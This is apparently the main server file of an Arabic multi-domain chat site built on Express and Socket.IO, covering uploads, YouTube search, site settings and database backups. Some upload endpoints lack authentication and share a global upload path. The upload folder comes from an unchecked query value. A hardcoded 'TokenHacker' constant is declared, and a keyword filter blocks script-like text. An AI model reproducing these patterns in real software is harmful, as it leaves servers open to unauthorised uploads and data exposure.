/* التشغيل دائماً من مجلد المشروع حتى تعمل كل المسارات النسبية
   (uploads, database, pem) على أي استضافة أو Docker */
process.chdir(__dirname);

/* عدم إسقاط السيرفر بسبب أي Promise لم يتم التعامل معه (مهم على الاستضافة) */
process.on("unhandledRejection", function (err) {
  console.log(
    "Unhandled promise rejection: " + (err && err.message ? err.message : err)
  );
});

const express = require("express");
const path = require("path");
const request = require("request");
const rateLimit = require('express-rate-limit');
const multer = require("multer");
const fs = require("fs");
const rimraf = require("rimraf");
const Jimp = require("jimp");
const passwordHash = require("password-hash");
const formidable = require("formidable");
const mysqlDump = require("mysqldump");
const cors = require("cors");
const fetch = require("node-fetch");
const cp = require("child_process");
const { getVideoDurationInSeconds } = require("get-video-duration");
const bodyParser = require("body-parser");
const { RateLimiterMemory } = require("rate-limiter-flexible");
const rateLimiter = new RateLimiterMemory({ points: 15, pointsduration: 1 });
const sharp = require('sharp');
const app = express();

const Config = require("./config");
const isPowers = require("./powers");

/* ---------------- الدومينات / CORS ----------------
   يقبل الدومين مع أو بدون www، ويقبل * لفتح كل الدومينات. */
function allowedHost(host) {
  if (Config.AllowAllDomains) return true;
  var h = String(host || "").toLowerCase().replace(/:\d+$/, "");
  var list = Config.ListDomin || [];
  for (var i = 0; i < list.length; i++) {
    var d = String(list[i]).toLowerCase().replace(/:\d+$/, "");
    if (d === "*" || d === h || "www." + d === h || d === "www." + h) {
      return true;
    }
  }
  return false;
}
function corsOrigin(origin, callback) {
  if (!origin) return callback(null, true);
  try {
    return callback(null, allowedHost(new URL(origin).hostname));
  } catch (e) {
    return callback(null, false);
  }
}

/* شهادة SSL محلية فقط. على الاستضافة نستخدم HTTP عادي (الاستضافة توفر HTTPS) */
function getSSLOptions() {
  try {
    return {
      key: fs.readFileSync(path.join(__dirname, "pem", "key.pem")),
      cert: fs.readFileSync(path.join(__dirname, "pem", "cert.pem")),
    };
  } catch (e) {
    console.log("SSL certificates not found, starting without HTTPS");
    return null;
  }
}
const limiter = rateLimit({
	windowMs: 1 * 60 * 1000,
	max: 50,
	standardHeaders: 'draft-7', 
	legacyHeaders: false,
})
var listalert = [];
var idshow = '';
var idhacker = '';
const AppDataBase = require("./database/database");
const GetBand = require("./router/ban_list");
const GetBars = require("./router/bars_list");
const GetBots = require("./router/bots_list");
const GetBsb = require("./router/bsb_list");
const GetCuts = require("./router/cut_list");
const GetIntroMsg = require("./router/intromsg_list");
const GetNames = require("./router/names_list");
const GetNoName = require("./router/noname_list");
const GetNoText = require("./router/notext_list");
const GetPowers = require("./router/powers_list");
const GetLogs = require("./router/logs_list");
const GetRooms = require("./router/rooms_list");
const GetSetting = require("./router/settings");
const GetMesg = require("./router/mesgs");
const GetStats = require("./router/state_list");
const GetSub = require("./router/subscribe_list");
const GetUsers = require("./router/users_list");
const GetHistLetter = require("./router/wordcf_list");
const GetEmo = require("./router/emo_list");
const GetSico = require("./router/sico_list");
const GetAtar = require("./router/atar_list");
const GetBack = require("./router/back_list");
const GetDro3 = require("./router/dro3_list");
const GetStory = require("./router/story_list");
const db = new AppDataBase();
const StoryRepo = new GetStory(db);
const BandRepo = new GetBand(db);
const BarsRepo = new GetBars(db);
const BotsRepo = new GetBots(db);
const MesgRepo = new GetMesg(db);
const BsbRepo = new GetBsb(db);
const CutsRepo = new GetCuts(db);
const IntroRepo = new GetIntroMsg(db);
const NamesRepo = new GetNames(db);
const NoNamesRepo = new GetNoName(db);
const NotextRepo = new GetNoText(db);
const PowersRepo = new GetPowers(db);
const LogsRepo = new GetLogs(db);
const RoomsRepo = new GetRooms(db);
const SettingRepo = new GetSetting(db);
const StateRepo = new GetStats(db);
const SubRepo = new GetSub(db);
const UsersRepo = new GetUsers(db);
const HistLetterRepo = new GetHistLetter(db);
const EmoRepo = new GetEmo(db);
const SicoRepo = new GetSico(db);
const AtarRepo = new GetAtar(db);
const BackRepo = new GetBack(db);
const Dro3Repo = new GetDro3(db);

EmoRepo.createTable();
SicoRepo.createTable();
Dro3Repo.createTable();
AtarRepo.createTable();
BackRepo.createTable();
BsbRepo.createTable();
UsersRepo.createTable();
/* [ADDED] عمود إشعار زيارة البروفايل: يتضاف مرة واحدة بعد إنشاء الجدول */
setTimeout(function () { UsersRepo.ensureVisitNotif(); }, 3000);
SettingRepo.createTable();
PowersRepo.createTable();
RoomsRepo.createTable();
NamesRepo.createTable();
SubRepo.createTable();
MesgRepo.createTable();
StoryRepo.createTable();
BandRepo.createTable();
LogsRepo.createTable();
StateRepo.createTable();
BotsRepo.createTable();
CutsRepo.createTable();
NotextRepo.createTable();
BarsRepo.createTable();
HistLetterRepo.createTable();
IntroRepo.createTable();
NoNamesRepo.createTable();
var LinkUpload = "";
var reconnct = "";
var UserChecked = [];
var OnlineUser = [];
var UserInfo = {};
var SiteSetting = [];
var PeerRoom = {};
var ShowPowers = [];
var NoNames = ["نايك", "شات", "دردشه", "دردشة", "http", "com", "انيك", "كسمك", "كصمك", "كسختك", "كصختك", "كحبه", "كحبة", "قحبة", "متناك", "منايك", "جلخ", "نياج", "منيوج", "فاشخ", "داعس", "سكس", "كس امك", "كس اختك", "شرموط", "انيك", "خواتك", "امهات", "كسم", "كسخ", "زب", "طيز", "كلب", "زوب", "عير","نيك"];
var RoomsList = [];
var RoomsListWith = [];
var SystemOpen = {};
var BrowserOpen = {};
const TokenHacker = '007';
var ListEnter = [];
var botsauto = [];
var ListWait = [];
var NoMsgFilter = [];
var ListBand = [];
var ekti1 = [];
var ekti2 = [];
const System = {
  system1: false,
  system2: false,
  system3: false,
  system4: false,
  system5: false,
  system6: false,
  system7: true,
};


const Browser = {
  browser1: false,
  browser2: false,
  browser3: false,
  browser4: false,
  browser5: false,
  browser6: false,
  browser7: false,
  browser8: false,
  browser9: true,
};


var BotBC = {
	nb:0,
	isbot:false,
	start:false,
	room:'',
	timestop:3,
	timestart:0,
	player:[]
}
var bottime;

const url = require("url");
const base64id = require("base64id");
const sslOptions = Config.UseSSL ? getSSLOptions() : null;
const http = sslOptions
  ? require("https").createServer(sslOptions, app)
  : require("http").createServer(app);
const io = require("socket.io")(http, {
  cors: {
    origin: corsOrigin,
    methods: ["GET", "POST"],
  },
  pingTimeout:1000 * 60 * 60 * 5,
    pingInterval:1000 * 60 * 60 * 5,
    upgradeTimeout:100,
    maxHttpBufferSize:8e8,
    connectionStateRecovery: {
        maxDisconnectionDuration: 7 * 60 * 1000,
        skipMiddlewares: true,
      }
});

io.engine.generateId = (req) => {
  return stringGen(32);
};
/* ===== بحث يوتيوب (نسخة مقاومة لتغيّر صفحة يوتيوب) =====
   - لو وضعت Config.YoutubeKey (مفتاح YouTube Data API v3) يستخدم الـ API الرسمي (الأضمن)
   - وإلا يقرأ ytInitialData من صفحة النتائج بدل الاعتماد على شكل HTML ثابت
   ملاحظة: مكتوب بصيغة متوافقة مع إصدارات Node القديمة (بدون ?. أو ??) */
var YT_CACHE = {};
function ytText(o) {
  if (!o) return "";
  if (typeof o.simpleText == "string") return o.simpleText;
  if (o.runs && o.runs.length) {
    return o.runs.map(function (r) { return r.text || ""; }).join("");
  }
  return "";
}
function ytExtractData(html) {
  var m = html.indexOf("ytInitialData");
  if (m < 0) return null;
  var st = html.indexOf("{", m);
  if (st < 0) return null;
  var depth = 0, inStr = false, esc = false;
  for (var i = st; i < html.length; i++) {
    var ch = html[i];
    if (inStr) {
      if (esc) esc = false;
      else if (ch === "\\") esc = true;
      else if (ch === '"') inStr = false;
    } else if (ch === '"') inStr = true;
    else if (ch === "{") depth++;
    else if (ch === "}") {
      depth--;
      if (depth === 0) {
        try { return JSON.parse(html.slice(st, i + 1)); } catch (e) { return null; }
      }
    }
  }
  return null;
}
function ytCollect(node, out, max) {
  if (out.length >= max || !node || typeof node !== "object") return;
  if (Array.isArray(node)) {
    for (var i = 0; i < node.length && out.length < max; i++) ytCollect(node[i], out, max);
    return;
  }
  var v = node.videoRenderer;
  if (v && v.videoId) {
    var dup = out.some(function (x) { return x.id === v.videoId; });
    if (!dup) {
      out.push({
        id: v.videoId,
        title: ytText(v.title),
        time: ytText(v.lengthText),
        channel: ytText(v.ownerText || v.longBylineText),
        views: ytText(v.shortViewCountText || v.viewCountText),
        link: "https://www.youtube.com/watch?v=" + v.videoId,
        thumbnail: "https://i.ytimg.com/vi/" + v.videoId + "/mqdefault.jpg",
      });
    }
    return;
  }
  for (var k in node) {
    if (out.length >= max) return;
    if (node[k] && typeof node[k] === "object") ytCollect(node[k], out, max);
  }
}
const searchYoutube = async function (query, nb) {
  var max = nb || 6;
  query = String(query || "").trim().slice(0, 100);
  if (!query) return [];
  var key = query.toLowerCase() + "|" + max;
  var hit = YT_CACHE[key];
  if (hit && Date.now() - hit.t < 10 * 60 * 1000) return hit.r;

  var result = [];
  if (Config.YoutubeKey) {
    var api =
      "https://www.googleapis.com/youtube/v3/search?part=snippet&type=video&maxResults=" +
      max + "&q=" + encodeURIComponent(query) + "&key=" + Config.YoutubeKey;
    var jr = await fetch(api, { timeout: 8000 }).then(function (r) { return r.json(); });
    (jr.items || []).forEach(function (it) {
      if (!it.id || !it.id.videoId) return;
      result.push({
        id: it.id.videoId,
        title: it.snippet.title,
        time: "",
        channel: it.snippet.channelTitle,
        views: "",
        link: "https://www.youtube.com/watch?v=" + it.id.videoId,
        thumbnail: "https://i.ytimg.com/vi/" + it.id.videoId + "/mqdefault.jpg",
      });
    });
  } else {
    var url =
      "https://www.youtube.com/results?hl=ar&sp=EgIQAQ%253D%253D&search_query=" +
      encodeURIComponent(query);
    var html = await fetch(url, {
      timeout: 8000,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36",
        "Accept-Language": "ar,en;q=0.8",
        Cookie: "CONSENT=YES+1; SOCS=CAI",
      },
    }).then(function (r) { return r.text(); });
    var data = ytExtractData(html);
    if (data) ytCollect(data, result, max);
  }
  if (result.length) YT_CACHE[key] = { t: Date.now(), r: result };
  return result;
};
app.get("/admin.html", function(req,res){
  res.send("Error 313 !")
})
let storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, __dirname + "/uploads/" + LinkUpload);
  },
  filename: (req, file, cb) => {
    if (typeof file != "object") {
      return;
    } else if (
      typeof file["mimetype"] != "string" ||
      typeof file["fieldname"] != "string"
    ) {
      return;
    }
    var extension = Config.TypeFile[file.mimetype];
    if (!extension) {
      return;
    }
    if (extension.includes("png")) {
      extension = "jpg";
    }
    cb(null, Date.now() + "." + extension);
  },
});

let upload = multer({
  storage: storage,
  preservePath: true,
  limits: { fileSize: Config.MaxUpload },
}).single("photo");
function getFiles(dir, files_) {
  files_ = files_ || [];
  var files = fs.readdirSync(dir);
  for (var i in files) {
    var name = dir + "/" + files[i];
    if (fs.statSync(name).isDirectory()) {
      getFiles(name, files_);
    } else {
      files_.push(name);
    }
  }
  return files_;
}
/* إنشاء مجلدات الرفع تلقائياً: ضروري على الاستضافة لأن Git لا يحفظ المجلدات الفارغة */
function ensureUploadDirs() {
  [
    "uploads",
    "uploads/site",
    "uploads/pic",
    "uploads/picroom",
    "uploads/sendfile",
    "uploads/story",
    "uploads/emo",
    "uploads/sico",
    "uploads/dro3",
    "uploads/atar",
    "uploads/back",
    "uploads/recorder",
    "database",
  ].forEach(function (dir) {
    try {
      fs.mkdirSync(dir, { recursive: true });
    } catch (e) {}
  });
}
ensureUploadDirs();

app.set("trust proxy", Config.TrustProxy ? 1 : false);
app.set("views", path.join(__dirname, "public"));
app.set("view engine", "ejs");
app.use(express.static(__dirname + '/public', { maxAge: 31557600 }));
app.use(express.static("uploads"));
app.get("/healthz", function (req, res) {
  res.status(200).send("ok");
});
app.use(bodyParser.urlencoded({extended: true}));
app.use(limiter);
app.use(cors({ origin: corsOrigin }));
app.post("/uploadURM", async (req, res) => {
  UsersRepo.getBy({ state: "getByToken", token: req.query["token"] }).then(
    async (user) => {
      if (user) {
        if (GetPower(user["power"])["owner"]) {
          if (
            req.query["state"] == "banner" ||
            req.query["state"] == "logo" ||
            req.query["state"] == "msgpic" ||
            req.query["state"] == "bacmic" ||
            req.query["state"] == "mic" ||
            req.query["state"] == "room" ||
            req.query["state"] == "user"
          ) {
            LinkUpload = "/site";
          } else {
            LinkUpload = "/" + req.query["state"];
          }
          try {
            await upload(req, res, function (err) {
              if (typeof req.file != "object") {
                return res.status(400).send({ message: "فشل رفع الملف" });
              }  if (req.query["state"] == "msgpic") {
                fs.rename(
                  req.file.path,
                  "uploads/" + LinkUpload + "/msgpic.png",
                  function (err) {
                    if (err) {
                      res.end(JSON.stringify({ err: true, msg: "" }));
                      return;
                    }
                  }
                );
              }
              if (
                req.query["state"] == "banner" ||
                req.query["state"] == "logo" ||
                req.query["state"] == "msgpic" ||
                req.query["state"] == "bacmic" ||
                req.query["state"] == "mic" ||
                req.query["state"] == "room" ||
                req.query["state"] == "user"
              )
               {
                Jimp.read(
                  "uploads/" + LinkUpload + "/" + req.file["filename"],
                  (err, lenna) => {
                    if (err) {
                      res.end(JSON.stringify({ err: true, msg: "" }));
                      return;
                    } else {
                      fs.unlink(
                        "uploads/" + LinkUpload + "/" + req.file["filename"],
                        (err) => {
                          if (err) {
                            res.end(JSON.stringify({ err: true, msg: "" }));
                            return;
                          }
                        }
                      );

                      lenna.write(
                        "uploads/" +
                          LinkUpload +
                          "/" +
                          req.file["filename"].replace(
                            req.file["filename"],
                            req.query["state"] == "user"
                              ? req.hostname + "pic.png"
                              : req.hostname + req.query["state"] + ".png"
                          )
                      );
                    }
                  }
                );

                SaveStats({
                  state:
                    req.query["state"] == "logo"
                      ? "تعديل ايقونة الموقع"
                      : req.query["state"] == "user"
                      ? "تعديل ايقونة الأعظاء"
                      : req.query["state"] == "bacmic"
                      ? "تعديل خلفيه المايكات"
                      : req.query["state"] == "mic"
                      ? "تعديل صوره المايكات"
                      : req.query["state"] == "room"
                      ? "تعديل ايقونة الرومات"
                      : req.query["state"] == "banner"
                      ? "تعديل بنر الموقع" 
                         : "",
                  topic: user["topic"],
                  ip: user["ip"],
                  username: user["username"],
                  room: "",
                  time: new Date().getTime(),
                });
              }

              if (
                req.query["state"] == "sico" ||
                req.query["state"] == "dro3" ||
                req.query["state"] == "atar" ||
                req.query["state"] == "back" ||
                req.query["state"] == "emo"
              ) {
                SaveStats({
                  state:
                    req.query["state"] == "sico"
                      ? "إظافة بنر | ايقونه"
                      : req.query["state"] == "dro3"
                     
                      ? "إظافة هدية | ايقونه"
                      : req.query['atar']
                      ? "إضافة اطار الصور"
                      : req.query['back']
                      ? "إضافة خلفية الاعضاء"
                      : "إظافة فيس | ايقونه",
                  topic: user["topic"],
                  ip: user["ip"],
                  username: user["username"],
                  room: "",
                  time: new Date().getTime(),
                });
              }

              if (req.query["state"] == "sico") {
                SicoRepo.create({ path: req.file["filename"] });
                RefreshSico();
              }
              if (req.query["state"] == "atar") {
                AtarRepo.create({ path: req.file["filename"] });
                RefreshAtar();
              }if (req.query["state"] == "back") {
                BackRepo.create({ path: req.file["filename"] });
                RefreshBack();
              } else if (req.query["state"] == "dro3") {
                Dro3Repo.create({ path: req.file["filename"] });
                RefreshDro3();
              }

              if (req.query["state"] == "emo") {
                /* [ADDED] إصلاح التعليق عند 100%: الرد بيرجع دايماً حتى لو جدول الايموشن فاضي أو حصل خطأ */
                EmoRepo.getByL().then((emo) => {
                  const lastType = emo && emo[0] ? Number(emo[0]["type"]) || 0 : 0;
                  const newType = lastType + 1;
                  return EmoRepo.create({
                    type: newType,
                    path: req.file["filename"],
                  }).then(() => {
                    RefreshEmo();
                    res.end(
                      JSON.stringify({
                        err: false,
                        msg:
                          req.query["state"] +
                          "/" +
                          req.file["filename"] +
                          "@" +
                          newType,
                      })
                    );
                  });
                }).catch((e) => {
                  console.log("emo upload error:", e && e.message);
                  if (!res.headersSent) {
                    res.status(500).end(
                      JSON.stringify({ err: true, msg: "فشل حفظ الايموشن" })
                    );
                  }
                });
              } else {
                res.end(
                  JSON.stringify({
                    err: false,
                    msg: req.file["filename"].replace(
                      req.file["filename"],
                      req.query["state"] == "user"
                        ? "pic.png?z" + randomNumber(1, 100)
                        : req.query["state"] == "sico" ||
                          req.query["state"] == "back" ||
                          req.query["state"] == "atar" ||
                          req.query["state"] == "dro3"
                        ? req.query["state"] + "/" + req.file["filename"]
                        : req.query["state"] + ".png?z" + randomNumber(1, 100)
                    ),
                  })
                );
              }
            });
          } catch (err) {
            if (err.code == "LIMIT_FILE_SIZE") {
              return res.status(500).send({
                message: "فشل إرسال الملف تأكد ان حجم الملف مناسب 20 ميجا",
              });
            }
            res.status(500).send({
              message: `Could not upload the file: ${req.file.originalname}. ${err}`,
            });
          }
        } else {
          res.end(JSON.stringify({ error: true, msg: "ليس لديك الصلاحية" }));
        }
      }
    }
  );
});

app.post("/uploadstory", async (req, res) => {
  LinkUpload = "/story";
  try {
    await upload(req, res, function (err) {
      if (typeof req.file != "object") {
        return res.status(400).send({ message: "فشل رفع الملف" });
      }
      if (
        req.file["filename"].includes(".jpg") ||
        req.file["filename"].includes(".jpeg") ||
        req.file["filename"].includes(".mov") ||
        req.file["filename"].includes(".mp4") ||
        req.file["filename"].includes(".mpa") ||
        req.file["filename"].includes(".webm") ||
        req.file["filename"].includes(".3gp") ||
        req.file["filename"].includes(".3gp2") ||
        req.file["filename"].includes(".png") ||
        req.file["filename"].includes(".gif")
      ) {
        Jimp.read("uploads/story/" + req.file["filename"], (err, lenna) => {
          if (err) {
          }
        });
      } else {
        return res.status(500).send({
          message: "الرجاء التحقق من صيغة الملف (mp4 , jpg , png, mov)",
        });
      }

      if (req.file["mimetype"].includes("video")) {
        /* لو ffmpeg غير مثبت على الاستضافة نستخدم مدة افتراضية بدل تعليق الطلب */
        var storyLink =
          LinkUpload +
          "/" +
          req.file["filename"] +
          "@" +
          req.file["mimetype"] +
          "@";
        getVideoDurationInSeconds("uploads/story/" + req.file["filename"])
          .then(function (duration) {
            var time = 20;
            if (parseInt(duration / 60, 10) > 0) {
              time = parseInt(duration / 60, 10) * 600;
            } else if (parseInt(duration / 60, 10) == 0) {
              time = (duration % 60) * 10;
            } else {
              time = 20;
            }
            res.json(storyLink + time);
          })
          .catch(function () {
            if (!res.headersSent) res.json(storyLink + 20);
          });
      } else {
        res.json(
          LinkUpload +
            "/" +
            req.file["filename"] +
            "@" +
            req.file["mimetype"] +
            "@" +
            20
        );
      }
    });
  } catch (err) {
    if (err.code == "LIMIT_FILE_SIZE") {
      return res
        .status(500)
        .send({ message: "فشل إرسال الملف تأكد ان حجم الملف مناسب 20 ميجا" });
    }
    res.status(500).send({
      message: `Could not upload the file: ${req.file.originalname}. ${err}`,
    });
  }
});

app.post("/upload", async(req, res)=> {
        LinkUpload = "/sendfile";
       try {
		await upload(req, res, function (err) {
			if (typeof req.file != 'object') {
				return res.status(400).send({ message: "فشل رفع الملف" });
			};
			
			
			if(req.file["filename"].includes('.jpg') || req.file["filename"].includes('.jpeg')){
				Jimp.read("uploads/sendfile/" + req.file["filename"], (err, lenna) => {
					if (err){
						
					}else{
						lenna.quality(60).write("uploads/sendfile/" + req.file["filename"]);
					};
				});
			};
			
			res.end("/sendfile/" + req.file["filename"]);
		});
  } catch (err) {
	    if(err.code == "LIMIT_FILE_SIZE") {
			return res.status(500).send({message: "فشل إرسال الملف تأكد ان حجم الملف مناسب 20 ميجا"});
		 };
		 res.status(500).send({message: `Could not upload the file: ${req.file.originalname}. ${err}`})
	};
});
app.post("/uppic", async (req, res) => {
  if (typeof req.query["nf"] != 'string') {
    return;
  } else if (req.query["nf"] == 'user' || req.query["nf"] == 'roomback' || req.query["nf"] == 'room' || req.query["nf"] == 'bot') {
  } else {
    return;
  };
  if (req.query["nf"] == 'user' || req.query["nf"] == 'bot') {
    LinkUpload = 'pic';
  } else {
    LinkUpload = 'picroom';
  };
  try {
    await upload(req, res, async function (err) {
      if (typeof req.file != 'object') {
        return res.status(400).send({ message: "فشل رفع الصوره" });
      } else if (typeof Config.TypeFileImage[req.file['mimetype']] != 'string') {
        return res.status(400).send({ message: "فشل رفع الصوره" });
      };
      await sharp("uploads/" + LinkUpload + "/" + req.file["filename"])
        .resize(150, 150, {
          fit: 'contain',
          background: 'transparent',
        })
        .toFile("uploads/" + LinkUpload + "/" + req.file["filename"] + '.jpg');
      res.json("/" + LinkUpload + "/" + req.file["filename"] + '@' + req.query["nf"]);
    });
  } catch (err) {
    if (err.code == "LIMIT_FILE_SIZE") {
      return res.status(500).send({
        message: "فشل إرسال الصوره تأكد ان حجم الصوره مناسب 20 ميجا",
      });
    }
    res.status(500).send({
      message: `Could not upload the file: ${req.file.originalname}. ${err}`,
    });
  }
});


app.get("/GET_ALL_USER_ONLINE", function (req, res, next) {
  res.end(
    JSON.stringify({
      powers: ShowPowers,
      online: filteredArray(OnlineUser, "s", false),
    })
  );
});

app.get("/uh", function (req, res) {
  UsersRepo.getBy({ state: "getByToken", token: req.query["token"] }).then(
    (user) => {
      if (user) {
        if (GetPower(user["power"])["history"]) {
          if (UserInfo[req.query["u2"]]) {
            NamesRepo.getBy({
              state: "getByIp",
              ip: UserInfo[req.query["u2"]]["ip"],
            }).then((dev) => {
              if (dev.length > 0) {
                res.send(dev);
              }
            });
          }
        }
      }
    }
  );
});

app.get("/", function (req, res) {
  if (allowedHost(req.hostname)) {
    SettingRepo.getBy({ state: "getByID", id: 1 }).then((getSettings) => {
      SettingRepo.getBy({ state: "getByHost", hostname: req.hostname }).then(
        (getSe) => {
          /* يكفي وجود إعدادات الدومين: لو الجدول جديد ولم يوجد صف id=1
             نستخدم صف الدومين نفسه بدل الدخول في حلقة تحويل لا نهائية */
          if (getSe) {
            SiteSetting = getSettings || getSe;
            fs.readFile("uploads/" + getSe["script"], function (err, f) {
              if (f) {
                var array = f.toString().split("\n");
                array = JSON.parse(array);
                res.render("index", {
                  title: array["title"] || "",
                  logo: "/site/" + getSe["logo"],
                  banner: "/site/" + getSe["banner"],
                  online: filteredArray(OnlineUser, "s", false).length,
                  online: 0,
                  host: req.hostname,
                  namehost: Config["hostnm"],
                  colors: {
                    hicolor: array["background"],
                    bgcolor: array["bg"],
                    btcolor: array["buttons"],
                  },
                  ifbanner: getSe["isbanner"],
                  script: String(array["settscr"]),
                  description: array["settdescription"] || "",
                  keywords: array["settkeywords"] || "",
                  istite: array["name"] || "",
                });
              } else {
                res.set("Content-Type", "text/html");
                res.write(
                  "<center><h1 style='color:#ff0000'>الموقع غير متاح </h1></center>"
                );
                res.end();
              }
            });
          } else {
            fs.writeFile(
              "uploads/" + req.hostname + ".txt",
              JSON.stringify({
                bg: "6e7b8c",
                buttons: "6e7b8c",
                background: "FFFFFF",
                name: "",
                settdescription: "",
                settscr: "",
                settkeywords: "",
              }),
              function (err) {
                if (err) {
                  SendNotification({
                    state: "me",
                    topic: "",
                    force: 1,
                    msg: "حدث حطأ الرجاء المحاولة في وقت لاحق",
                    user: "",
                  });
                  return res.status(500).send("حدث خطأ، حاول مرة أخرى");
                }
                /* نسخ الصور الافتراضية باسم الدومين الجديد حتى يظهر الموقع
                   بشكل سليم من أول زيارة (اللوجو/البنر/صورة العضو/الغرفة) */
                var _siteDefaults = {
                  logo: "logo.png",
                  banner: "banner.png",
                  room: "room.png",
                  pic: "pic.png",
                  user: "pic.png",
                  site: "site.png",
                };
                Object.keys(_siteDefaults).forEach(function (key) {
                  var src = path.join(
                    __dirname,
                    "uploads",
                    "site",
                    _siteDefaults[key]
                  );
                  var dest = path.join(
                    __dirname,
                    "uploads",
                    "site",
                    req.hostname + key + ".png"
                  );
                  try {
                    if (fs.existsSync(src) && !fs.existsSync(dest)) {
                      fs.copyFileSync(src, dest);
                    }
                  } catch (e) {}
                });
                /* أول زيارة للدومين: ننشئ الإعدادات ثم نعيد تحميل الصفحة
                   بدون process.exit حتى لا يتوقف السيرفر على الاستضافة */
                SettingRepo.create({
                  hostname: req.hostname,
                  room: "3ihxjl18it",
                  logo: req.hostname + "logo.png",
                  roompic: req.hostname + "room.png",
                  site: req.hostname + "site.png",
                  user: req.hostname + "user.png",
                })
                  .then(function () {
                    res.redirect("/");
                  })
                  .catch(function () {
                    res.status(500).send("حدث خطأ في إنشاء إعدادات الموقع");
                  });
              }
            );
          }
        }
      );
    });
  } else {
    res.set("Content-Type", "text/html");
    res.write(
      "<center><h1 style='color:#ff0000'>الموقع غير متاح </h1></center>"
    );
    res.end();
  }
});
String.prototype.replaceAll = function (str1, str2, ignore) {
  return this.replace(
    new RegExp(
      str1.replace(
        /([\/\,\!\\\^\$\{\}\[\]\(\)\.\.{0,3}$*\+\?\|\<\>\-\&])/g,
        "\\$&"
      ),
      ignore ? "gi" : "g"
    ),
    typeof str2 == "string" ? str2.replace(/\$/g, "$$$$") : str2
  );
};
/* النسخ الاحتياطي يحتاج برنامج mysqldump على السيرفر.
   أغلب الاستضافات المجانية لا توفرها، لذلك نتحقق أولاً بدل إسقاط السيرفر. */
var _hasMysqlDump = null;
function mysqlDumpAvailable() {
  if (_hasMysqlDump !== null) return _hasMysqlDump;
  try {
    var r = cp.spawnSync("mysqldump", ["--version"], { stdio: "ignore" });
    _hasMysqlDump = !r.error && r.status === 0;
  } catch (e) {
    _hasMysqlDump = false;
  }
  if (!_hasMysqlDump) {
    console.log("mysqldump not found: database backup is disabled");
  }
  return _hasMysqlDump;
}

function DatabaseDump(data) {
  if (!mysqlDumpAvailable()) return;
  try {
    var ret = mysqlDump(
      {
        connection: {
          host: Config.HostDB,
          port: Config.DBPort,
          user: Config.UserDB,
          password: Config.PassDB,
          database: Config.DBDB,
        },
        dumpToFile: data,
      },
      function (err) {
        if (err) console.log("Database backup error: " + (err.message || err));
      }
    );
    if (ret && typeof ret.catch === "function") {
      ret.catch(function (err) {
        console.log("Database backup error: " + (err && err.message));
      });
    }
  } catch (e) {
    console.log("Database backup error: " + (e && e.message));
  }
}

function BackUpDataBase() {
  if (!Config.DatabaseBackup) return; // مطفأ على الاستضافة (شغّله بـ DB_BACKUP=1)
  if (
    !fs.existsSync(
      "database/database" +
        new Date().toLocaleDateString().replaceAll("/", "-") +
        ".sql"
    )
  ) {
    DatabaseDump(
      "database/database" +
        new Date().toLocaleDateString().replaceAll("/", "-") +
        ".sql"
    );
  }
}
function stringGen(len) {
  var text = "";
  var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < len; i++)
    text += charset.charAt(Math.floor(Math.random() * charset.length));
  return text;
}
function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min)) + min;
}
function filteredArray(arr, key, value) {
  const newArray = [];
  for (i = 0, l = arr.length; i < l; i++) {
    if (!arr[i][key]) {
      newArray.push(arr[i]);
    }
  }
  return newArray;
}
function ValidateIPaddress(ipaddress) {
  if (
    /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(
      ipaddress
    )
  ) {
    return true;
  }
  return false;
}

function randomNumber(minimum, maximum) {
  return Math.round(Math.random() * (maximum - minimum) + minimum);
}
function addDays(days) {
  return new Date(Date.now() + days * 24 * 60 * 60 * 1000).getTime().toFixed();
}

setInterval(function () {
  if (OnlineUser.length > 0) {
    const isoffline = OnlineUser.filter(function (item) {
      return item.stat == 3;
    });
    if (isoffline.length > 0) {
      for (var i = 0; i < isoffline.length; i++) {
          io.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "ur",
            data: [isoffline[i]["id"], null],
          });
          io.emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "u-",
            data: isoffline[i]["id"],
          });
          OnlineUser.splice(
            OnlineUser.findIndex((v) => v.id == isoffline[i]["id"]),
            1
          );
          delete UserInfo[isoffline[i]["id"]];
        }
    }
  }
}, Config.TimeOffline * 60 * 60 * 1000);
function IsBand(data) {
  if (data) {
    const isbands = ListBand.findIndex(
      (x) => x.device && data.includes(x.device)
    );
    if (isbands != -1) {
      return ListBand[isbands]["device"];
    } else {
      return false;
    }
  }
}

function RefreshBand() {
  BandRepo.getBy({ state: "getAll", limit: 1000 }).then((res) => {
    if (res) {
      ListBand = res;
    }
  });
}

function MessagesList(data) {
  if (typeof data == "object") {
    if (data["state"] == "LogsMsg") {
      if (
        GetPower(UserInfo[data["id"]]["power"])["stealth"] &&
        UserInfo[data["id"]]["stealth"]
      ) {
      } else {
        if (data["idroom"]) {
          io.to(data["idroom"]).emit("SEND_EVENT_EMIT_SERVER", {
            cmd: "msg",
            data: {
              bg: data["bg"],
              class: data["class"],
              id: data["id"],
              topic: data["topic"],
              msg: data["msg"],
              roomid: data["idroom"],
              pic: data["pic"],
              uid: data["id"],
            },
          });
        }
      }
    }
  }
}
function NoTa5(data) {
  if (
    data.includes("load") ||
    data.includes("socket") ||
    data.includes("èmit") ||
    data.includes("console") ||
    data.includes("localStorage") ||
    data.includes(">") ||
    data.includes("<")

  ) {
    return true;
  } else {
    return false;
  }
}

function RefreshEmo() {
  EmoRepo.getAll().then((res) => {
    io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "emos", data: res });
  });
}

function RefreshDro3() {
  Dro3Repo.getAll().then((res) => {
    io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "dro3", data: res });
    io.emit("seoo",{
      cmd:"dro3",
      data:res
    });
  });
}

function RefreshSico() {
  SicoRepo.getAll().then((res) => {
    io.emit("SEND_EVENT_EMIT_SERVER", { cmd: "sicos", data: res });
    io.emit("seoo",{
      cmd:"sico",
      data:res
    });
  });
}
